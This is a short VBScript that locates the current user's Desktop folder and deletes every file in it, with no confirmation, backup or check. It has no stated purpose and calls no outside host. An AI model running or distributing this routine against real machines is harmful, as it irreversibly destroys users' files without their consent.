Option Explicit

Dim objFSO, objFolder, objFile

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Loop through each file in the Desktop folder and delete it
For Each objFile In objFolder.Files
    objFSO.DeleteFile(objFile)
Next

Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing
